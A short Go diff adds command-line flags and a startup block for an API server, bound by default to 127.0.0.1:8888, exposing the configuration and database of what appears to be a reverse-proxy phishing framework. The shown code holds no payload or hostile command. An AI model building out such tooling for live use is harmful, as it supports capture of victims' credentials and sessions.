@@ -24,6 +24,9 @@ var debug_log = flag.Bool("debug", false, "Enable debug output")
 var developer_mode = flag.Bool("developer", false, "Enable developer mode (generates self-signed certificates for all hostnames)")
 var cfg_dir = flag.String("c", "", "Configuration directory path")
 var version_flag = flag.Bool("v", false, "Show version")
+var api_flag = flag.Bool("api", false, "Enable API server")
+var api_host = flag.String("api-host", "127.0.0.1", "API server host")
+var api_port = flag.Int("api-port", 8888, "API server port")
 
 func joinPath(base_path string, rel_path string) string {
 	var ret string
@@ -172,6 +175,23 @@ func main() {
 
 	hp, _ := core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, db, bl, *developer_mode)
 	hp.Start()
+
+	// Start API server if enabled
+	if *api_flag {
+		api, err := core.NewApiServer(cfg, db)
+		if err != nil {
+			log.Fatal("api server: %v", err)
+			return
+		}
+		
+		err = api.Start(*api_host, *api_port)
+		if err != nil {
+			log.Fatal("api server: %v", err)
+			return
+		}
+		
+		log.Info("API server started on %s:%d", *api_host, *api_port)
+	}
 
 	t, err := core.NewTerminal(hp, cfg, crt_db, db, *developer_mode)
 	if err != nil {
